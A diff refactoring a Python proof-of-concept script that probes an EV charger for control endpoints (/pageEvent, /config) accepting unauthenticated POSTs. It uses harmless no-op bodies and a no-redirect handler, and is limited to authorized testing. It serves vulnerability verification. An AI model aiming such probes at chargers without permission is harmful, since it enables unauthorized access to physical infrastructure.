@@ -42,7 +42,6 @@ Only run this against a charger you own / are authorized to test.
 from __future__ import annotations
 
 import argparse
-import socket
 import ssl
 import urllib.error
 import urllib.request
@@ -51,7 +50,6 @@ import urllib.request
 PROTECTED = ["/ocppconfig", "/service"]
 
 # No-auth control endpoints under test (expected on a vulnerable unit: NOT 401).
-# body=None -> empty POST body (no recognized action/field => no state change).
 CONTROL = [
     ("/pageEvent", "grizzle_poc_probe=0"),   # unknown key -> matches no action
     ("/config", ""),                          # empty body -> nothing to change
@@ -69,15 +67,13 @@ def _request(url: str, *, method: str, body: bytes | None, timeout: float,
     req.add_header("User-Agent", "grizzle-n1-poc")
     if body is not None:
         req.add_header("Content-Type", "application/x-www-form-urlencoded")
-    ctx = None
+    # A redirect (to a login page, say) must not be followed and then read as "200, processed".
+    handlers: list = [_NoRedirect]
     if url.startswith("https"):
         ctx = ssl.create_default_context()
         if insecure:
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
-    # A redirect (to a login page, say) must not be followed and then read as "200, processed".
-    handlers: list = [_NoRedirect]
-    if ctx is not None:
         handlers.append(urllib.request.HTTPSHandler(context=ctx))
     opener = urllib.request.build_opener(*handlers)
     try:
@@ -92,7 +88,7 @@ def _request(url: str, *, method: str, body: bytes | None, timeout: float,
         except Exception:
             pass
         return e.code, dict(e.headers or {}), data.decode("latin1", "replace"), None
-    except (urllib.error.URLError, socket.timeout, ConnectionError, OSError) as e:
+    except OSError as e:  # URLError, timeouts, refused or reset connections
         return None, {}, "", str(e)
 
 
@@ -147,7 +143,7 @@ def main() -> int:
     unauth_hits = []
     inconclusive = []
     for path, body in CONTROL:
-        data = body.encode() if body is not None else b""
+        data = body.encode()
         status, headers, rbody, err = _request(base + path, method="POST", body=data,
                                                 timeout=args.timeout, insecure=args.insecure)
         if err:
